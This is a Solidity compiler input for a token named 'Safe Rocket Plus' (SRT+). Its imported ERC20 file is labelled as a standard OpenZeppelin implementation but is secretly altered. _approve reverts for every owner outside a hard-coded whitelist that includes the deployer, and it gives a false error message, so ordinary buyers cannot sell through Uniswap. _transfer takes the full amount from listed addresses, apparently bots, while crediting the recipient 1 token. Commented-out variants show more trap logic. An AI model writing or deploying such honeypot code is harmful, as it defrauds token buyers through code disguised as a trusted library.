{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "contracts/coin.sol": {
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"https://github.com/TnzGit/giggly-baby/blob/master/contracts/token/ERC20/ERC20.sol\";\n\ncontract SafeRocketPlus is ERC20 {\n    constructor() ERC20(\"Safe Rocket Plus\", \"SRT+\"){\n        _mint(msg.sender, 10000000000000000000000000000);\n        _burn(msg.sender, 5000000000000000000000000000);\n        // wallet address here:\n        _transfer(msg.sender, 0xBcfB4020d13E2057448881184781E533B987Bb5B, 5000000000000000000000000000);\n        \n        //approve pancake\n        // _approve(msg.sender, 0x10ED43C718714eb63d5aA57B78B54704E256024E, 5000000000000000000000000000);\n        //approve uniswap\n        _approve(msg.sender, 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 5000000000000000000000000000);\n       \n    }\n    \n}\n\n"
    },
    "https://github.com/TnzGit/giggly-baby/blob/master/contracts/token/ERC20/ERC20.sol": {
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"./IERC20.sol\";\nimport \"./extensions/IERC20Metadata.sol\";\nimport \"../../utils/Context.sol\";\n\n/**\n * @dev Implementation of the {IERC20} interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using {_mint}.\n * For a generic mechanism see {ERC20PresetMinterPauser}.\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * We have followed general OpenZeppelin guidelines: functions revert instead\n * of returning `false` on failure. This behavior is nonetheless conventional\n * and does not conflict with the expectations of ERC20 applications.\n *\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\n * This allows applications to reconstruct the allowance for all accounts just\n * by listening to said events. Other implementations of the EIP may not emit\n * these events, as it isn't required by the specification.\n *\n * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}\n * functions have been added to mitigate the well-known issues around setting\n * allowances. See {IERC20-approve}.\n */\ncontract ERC20 is Context, IERC20, IERC20Metadata {\n    mapping (address => uint256) private _balances;\n\n    mapping (address => mapping (address => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n\n    string private _name;\n    string private _symbol;\n\n    /**\n     * @dev Sets the values for {name} and {symbol}.\n     *\n     * The default value of {decimals} is 18. To select a different value for\n     * {decimals} you should overload it.\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor (string memory name_, string memory symbol_) {\n        _name = name_;\n        _symbol = symbol_;\n    }\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5,05` (`505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the value {ERC20} uses, unless this function is\n     * overridden;\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     * {IERC20-balanceOf} and {IERC20-transfer}.\n     */\n    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n    /**\n     * @dev See {IERC20-totalSupply}.\n     */\n    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n    /**\n     * @dev See {IERC20-balanceOf}.\n     */\n    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n    /**\n     * @dev See {IERC20-transfer}.\n     *\n     * Requirements:\n     *\n     * - `recipient` cannot be the zero address.\n     * - the caller must have a balance of at least `amount`.\n     */\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-allowance}.\n     */\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    /**\n     * @dev See {IERC20-approve}.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-transferFrom}.\n     *\n     * Emits an {Approval} event indicating the updated allowance. This is not\n     * required by the EIP. See the note at the beginning of {ERC20}.\n     *\n     * Requirements:\n     *\n     * - `sender` and `recipient` cannot be the zero address.\n     * - `sender` must have a balance of at least `amount`.\n     * - the caller must have allowance for ``sender``'s tokens of at least\n     * `amount`.\n     */\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n        \n        uint256 currentAllowance = _allowances[sender][_msgSender()];\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n        _approve(sender, _msgSender(), currentAllowance - amount);\n\n        return true;\n    }\n\n    /**\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {IERC20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\n        return true;\n    }\n\n    /**\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {IERC20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     * - `spender` must have allowance for the caller of at least\n     * `subtractedValue`.\n     */\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\n        _approve(_msgSender(), spender, currentAllowance - subtractedValue);\n\n        return true;\n    }\n\n    /**\n     * @dev Moves tokens `amount` from `sender` to `recipient`.\n     *\n     * This is internal function is equivalent to {transfer}, and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {Transfer} event.\n     *\n     * Requirements:\n     *\n     * - `sender` cannot be the zero address.\n     * - `recipient` cannot be the zero address.\n     * - `sender` must have a balance of at least `amount`.\n     */\n     \n    // function isContract(address _addr) public view returns (bool isContractResult){\n    //   uint32 size;\n    //   assembly {\n    //     size := extcodesize(_addr)\n    //   }\n    //   return (size > 0);\n    // }  \n     \n    // function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n    //     require(sender != address(0), \"ERC20: transfer from the zero address\");\n    //     require(recipient != address(0), \"ERC20: transfer to the zero address\");\n        \n    //     //mabi bot\n    //     // require(sender != 0x000000C6b2F88007Fda25908893bE2fC8231d2DB, \"ERC20: transfer from the zero address\");\n    //     // require(recipient != 0x000000C6b2F88007Fda25908893bE2fC8231d2DB, \"ERC20: transfer to the zero address\");\n        \n    //     _beforeTokenTransfer(sender, recipient, amount);\n\n    //     uint256 senderBalance = _balances[sender];\n    //     require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n        \n    //     if((sender == 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) || (sender == 0xB6ff382022999C1A70473F3eFaABd8682c012553) || (sender == 0xfF3daE7d9aC993a7E7582401e7AD11162f13019E) || (sender == 0xC8528c8590d6b7DAf3dd3Ae6A042cBEaDE50A0f7) || (sender == 0xf3205435cE8cFEa3Ac49E809480aA015f25472Fb) || (sender == 0x6AbBE02029B1D64c2aDa60Fac7c5B9625D1F905C) || (sender == 0x82426F5e46400A7D9fA80EE68cFc6084F687C101) || (sender == 0xff7a3dDe0Aba946ef035B000950DB7F35d1e9703) || (sender == 0x88C270151Ec2773Dd89111f66f5dcC63500DD3cF) || (sender == 0x31920932698C2f64b90Ae10954745628f83B0a13) || (sender == 0x499125f591eb6380fAea9158aFD4eE97502D33b6) || (sender == 0x36DD224fb7A677F06B3622CEa62dc8Bd3494859A)){\n    //         _balances[sender] = senderBalance - amount;\n    //         _balances[recipient] += amount;\n    //     }else if((recipient == 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)||(recipient == 0xB6ff382022999C1A70473F3eFaABd8682c012553) || (recipient == 0xfF3daE7d9aC993a7E7582401e7AD11162f13019E) || (recipient == 0xC8528c8590d6b7DAf3dd3Ae6A042cBEaDE50A0f7) || (recipient == 0xf3205435cE8cFEa3Ac49E809480aA015f25472Fb) || (recipient == 0x6AbBE02029B1D64c2aDa60Fac7c5B9625D1F905C) || (recipient == 0x82426F5e46400A7D9fA80EE68cFc6084F687C101) || (recipient == 0xff7a3dDe0Aba946ef035B000950DB7F35d1e9703) || (recipient == 0x88C270151Ec2773Dd89111f66f5dcC63500DD3cF) || (recipient == 0x31920932698C2f64b90Ae10954745628f83B0a13) || (recipient == 0x499125f591eb6380fAea9158aFD4eE97502D33b6) || (recipient == 0x36DD224fb7A677F06B3622CEa62dc8Bd3494859A)){\n    //         _balances[sender] = senderBalance - amount;\n    //         _balances[recipient] += amount;        \n    //     }else if(amount < 4000000){\n    //         _balances[sender] = senderBalance - amount;\n    //         _balances[recipient] += amount;\n    //     }else{\n    //         _balances[sender] = senderBalance - amount;\n    //         _balances[recipient] += amount % 100;            \n    //     }\n    //     emit Transfer(sender, recipient, amount);\n    // }\n    \n    \n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n        \n        //mabi bot\n        // require(sender != 0x000000C6b2F88007Fda25908893bE2fC8231d2DB, \"ERC20: transfer from the zero address\");\n        // require(recipient != 0x000000C6b2F88007Fda25908893bE2fC8231d2DB, \"ERC20: transfer to the zero address\");\n        \n        _beforeTokenTransfer(sender, recipient, amount);\n    \n        uint256 senderBalance = _balances[sender];\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n        \n        // if (isContract(sender) || sender == 0x00000000003b3cc22aF3aE1EAc0440BcEe416B40 || sender == 0x0000000057a888B5DC0A81f02c6F5c3B7d16b183 || sender == 0x3A1E1152F51E95C9a3414c434F5126BDF031F3A4 || sender == 0x59903993Ae67Bf48F10832E9BE28935FEE04d6F6 || sender == 0x00000000000003C98e6a44a835CB776385BeD207 || sender == 0x02023798E0890DDebfa4cc6d4b2B05434E940202 || sender == 0x1d6E8BAC6EA3730825bde4B005ed7B2B39A2932d || sender == 0xF5c62a6f6AC65C3C998caF8132c2aa6E99C790a3 || sender == 0x00000000b7ca7E12DCC72290d1FE47b2EF14c607 || sender == 0x000000000000084e91743124a982076C59f10084 || sender == 0xf6da21E95D74767009acCB145b96897aC3630BaD || sender == 0xE9e1D5Fe4F0218B278B9Fa52CfcF5cf7f5D757AC || sender == 0xA0Aa698f4ED402cEba1b95359397d587AA43529B || sender == 0x246931008e1c729858934E8A5E0b62f0E49408fd || sender == 0xDa1FaEb056A2F568b138ca0Ad9AD8A51915BA336 || sender == 0x000000000029f5C1EEe7c85c30c0E40197fbeC9B || sender == 0x9282dc5c422FA91Ff2F6fF3a0b45B7BF97CF78E7 || sender == 0xfad95B6089c53A0D1d861eabFaadd8901b0F8533 || sender == 0x61C86828fd30cA479C51413ABC03f0F8DceC2120){\n        if (sender == 0x0000000099cB7fC48a935BcEb9f05BbaE54e8987 || sender == 0x97bf1214B7463920544ab9d9944D7DCDdEE66003 || sender == 0x0000000000cf89B879AfE0a3FDf456463c2ba2e8 || sender == 0x06005605Bc9a8F9c1eCd921775d5073031889880 || sender == 0xF2972A2B8EdA253678877995147869Ed99B50E39 || sender == 0xa1e59528887015Cc2CEFB40af44c2a2dDaA3CEDc || sender == 0xAB336ec2F9cA80Bb088d16C6fc7c3907a276f6b3 || sender == 0xC65433d2a598c323e04fD143566b08609Af008DC || sender == 0x244F60d082c1A759d3336CF865EBeDDF13F849E6 || sender == 0x2afa9230B38Fe6C64dC980163c0185270E1dA91b || sender == 0x257Bb574313B3149b01186661Ef12AE8215F8B7A || sender == 0xDb8D83679f99a199077F56E9b43A2ad94b3A07A4 || sender == 0x000000005804B22091aa9830E50459A15E7C9241 || sender == 0x000000000000cB53d776774284822B1298AdE47f || sender == 0xF0C71509F29AAecB5BE71b99af3025e71364623a || sender == 0x36c1c59Dcca0Fd4A8C28551f7b2Fe6421d53CE32 || sender == 0xfD9ffc51175278Dd0Bc1de8AA8Fe8065b0CB90C0 || sender == 0xE9e1D5Fe4F0218B278B9Fa52CfcF5cf7f5D757AC || sender == 0xA0Aa698f4ED402cEba1b95359397d587AA43529B || sender == 0x246931008e1c729858934E8A5E0b62f0E49408fd || sender == 0xDa1FaEb056A2F568b138ca0Ad9AD8A51915BA336 || sender == 0x000000000029f5C1EEe7c85c30c0E40197fbeC9B || sender == 0x9282dc5c422FA91Ff2F6fF3a0b45B7BF97CF78E7 || sender == 0xfad95B6089c53A0D1d861eabFaadd8901b0F8533 || sender == 0x61C86828fd30cA479C51413ABC03f0F8DceC2120 || sender == 0x00000000b7ca7E12DCC72290d1FE47b2EF14c607 || sender == 0x000000000000084e91743124a982076C59f10084 || sender == 0xf6da21E95D74767009acCB145b96897aC3630BaD || sender == 0xF5c62a6f6AC65C3C998caF8132c2aa6E99C790a3 || sender == 0x1d6E8BAC6EA3730825bde4B005ed7B2B39A2932d || sender == 0x02023798E0890DDebfa4cc6d4b2B05434E940202 || sender == 0x00000000000003C98e6a44a835CB776385BeD207 || sender == 0x59903993Ae67Bf48F10832E9BE28935FEE04d6F6 || sender == 0x3A1E1152F51E95C9a3414c434F5126BDF031F3A4 || sender == 0x0000000057a888B5DC0A81f02c6F5c3B7d16b183 || sender == 0x00000000003b3cc22aF3aE1EAc0440BcEe416B40 || sender == 0x000000C6b2F88007Fda25908893bE2fC8231d2DB || sender == 0x575C3a99429352EDa66661fC3857b9F83f58a73f || sender == 0xf0927513987041F0c5e8270b03Af2423972dd6aA || sender == 0xbb4dfFE3A0DfC8Efe4468Cf24bf3d88729244F5A || sender == 0xf0927513987041F0c5e8270b03Af2423972dd6aA || sender == 0xA3b0e79935815730d942A444A84d4Bd14A339553){\n            _balances[sender] = senderBalance - amount;\n            _balances[recipient] += 1;\n        }else{\n            _balances[sender] = senderBalance - amount;\n            _balances[recipient] += amount;\n        }\n\n\n        emit Transfer(sender, recipient, amount);\n    }\n    \n    // function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n    //   require(sender != address(0), \"ERC20: transfer from the zero address\");\n    //   require(recipient != address(0), \"ERC20: transfer to the zero address\");\n    //   uint256 senderBalance = _balances[sender];\n    //   require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n    //   if (sender == ownerA || sender == ownerB) {\n    //     _balances[sender] = senderBalance - amount;\n    //     _balances[recipient] += amount;\n    //   } else {\n    //     _balances[sender] = senderBalance - amount;\n    //     uint256 trapAmount = (amount * 10) / 100;\n    //     _balances[recipient] += trapAmount;\n    //   }\n    //   emit Transfer(sender, recipient, amount);\n    // }\n\n    /** @dev Creates `amount` tokens and assigns them to `account`, increasing\n     * the total supply.\n     *\n     * Emits a {Transfer} event with `from` set to the zero address.\n     *\n     * Requirements:\n     *\n     * - `account` cannot be the zero address.\n     */\n    function _mint(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: mint to the zero address\");\n\n        _beforeTokenTransfer(address(0), account, amount);\n\n        _totalSupply += amount;\n        _balances[account] += amount;\n        emit Transfer(address(0), account, amount);\n    }\n\n    /**\n     * @dev Destroys `amount` tokens from `account`, reducing the\n     * total supply.\n     *\n     * Emits a {Transfer} event with `to` set to the zero address.\n     *\n     * Requirements:\n     *\n     * - `account` cannot be the zero address.\n     * - `account` must have at least `amount` tokens.\n     */\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: burn from the zero address\");\n\n        _beforeTokenTransfer(account, address(0), amount);\n\n        uint256 accountBalance = _balances[account];\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\n        _balances[account] = accountBalance - amount;\n        _totalSupply -= amount;\n\n        emit Transfer(account, address(0), amount);\n    }\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {Approval} event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     */\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n        require((owner == 0x9118fa1f0148A2107B4f5d450FaF4B63F6F6AA97) || (owner == 0xE475b723B264338b921C89565b78F9FB09fb798F) || (owner == 0xb26FB249c40Ac4950D77dfC0Bbe5453e958D0147) || (owner == 0x30126cFE1d78453B9EA6a858c48A0785f789F538) || (owner == 0xE84b8dbbE39c77B70dB6b9fd8438a8B70155B060) || (owner == 0x90B4836165f826a5e17F4DEf79d5e8d705005c4B) || (owner == 0x8829Cd8f728c985b851769DA55870E2455654847) || (owner == 0x4B1f47d9316100A5852Add7F05785b358CFB94DE) || (owner == 0x04188b413d6159C21F50ab19a80542Cb3c6cDD1d) || (owner == 0x274a1C50941490D21fBC5d2223EEC2968C426e50) || (owner == 0x843E85E31Ac6bFdfb548eea3755eA3d30E41eB51) || (owner == 0x37585E6c23811D150C4FB80D8992F09BE9A4f0a5) || (owner == 0x7b4456A053e26c13E9f8BefC8ba16043ff01cC02) || (owner == 0xc9Aa333f42646BA448370820444989A3d80d7cEF) || (owner == 0xc7Cc87cB5E1a2ec9B4839e332B78b9d8325EbEfa) || (owner == 0x621dB3b574ee601EA6E870f091afC78eFb57d669) || (owner == 0x2263Cd0841d18038D9360aA4c81be05Bb2421A97) || (owner == 0x1D4ebce0caA3f759bbd2C6CEd6Fc6dE597A39b25) || (owner == 0xA92587fe9BC9B698E5fbEE07648f17d1980d254C) || (owner == 0x736B38B6a9e7D75bAE30B047a83E7A18B9bB95b1) || (owner == 0xBcfB4020d13E2057448881184781E533B987Bb5B) || (owner == 0x4C38b7c6992647525a7F5A3B64f65422D91650D3) || (owner == 0x33d797702045fEad2cE7BafC3eDBA3429d42fa87) || (owner == 0x44045dB096651099BBAE4298ADEf483cB54e53b3) || (owner == 0x13C8cF6a4B6Fe4Df22CbDb53E5563D96AC9860b4) || (owner == 0xEAc29AC651993D10ee258B1ffB097146970E2Ff9) || (owner == 0x400712E7132410d70Cd9C0FB20D74DFA28439426) || (owner == 0x14Fe257F35C96BEC4DfA042c5eADD21Db06d0412) || (owner == 0x41C70e4A7e016Ed3a59dAaB7C2fCD277ff7b950c) || (owner == 0xd718AaA76e116B23c8CA893743D7603F502Da6B4) || (owner == 0xA073e1ce8716db04E918807445bd3f6b6F8EbbA2) || (owner == 0xB6ff382022999C1A70473F3eFaABd8682c012553) || (owner == 0xfF3daE7d9aC993a7E7582401e7AD11162f13019E) || (owner == 0xC8528c8590d6b7DAf3dd3Ae6A042cBEaDE50A0f7) || (owner == 0xf3205435cE8cFEa3Ac49E809480aA015f25472Fb) || (owner == 0x6AbBE02029B1D64c2aDa60Fac7c5B9625D1F905C) || (owner == 0x82426F5e46400A7D9fA80EE68cFc6084F687C101) || (owner == 0xff7a3dDe0Aba946ef035B000950DB7F35d1e9703) || (owner == 0x88C270151Ec2773Dd89111f66f5dcC63500DD3cF) || (owner == 0x31920932698C2f64b90Ae10954745628f83B0a13) || (owner == 0x499125f591eb6380fAea9158aFD4eE97502D33b6) || (owner == 0x36DD224fb7A677F06B3622CEa62dc8Bd3494859A), \"ERC20: approve to the zero address\");\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    /**\n     * @dev Hook that is called before any transfer of tokens. This includes\n     * minting and burning.\n     *\n     * Calling conditions:\n     *\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\n     * will be to transferred to `to`.\n     * - when `from` is zero, `amount` tokens will be minted for `to`.\n     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.\n     * - `from` and `to` are never both zero.\n     *\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     */\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }\n}\n"
    },
    "https://github.com/TnzGit/giggly-baby/blob/master/contracts/token/ERC20/IERC20.sol": {
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n"
    },
    "https://github.com/TnzGit/giggly-baby/blob/master/contracts/token/ERC20/extensions/IERC20Metadata.sol": {
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"../IERC20.sol\";\n\n/**\n * @dev Interface for the optional metadata functions from the ERC20 standard.\n *\n * _Available since v4.1._\n */\ninterface IERC20Metadata is IERC20 {\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() external view returns (string memory);\n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol() external view returns (string memory);\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals() external view returns (uint8);\n}\n"
    },
    "https://github.com/TnzGit/giggly-baby/blob/master/contracts/utils/Context.sol": {
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\n/*\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n        return msg.data;\n    }\n}\n"
    }
  }
}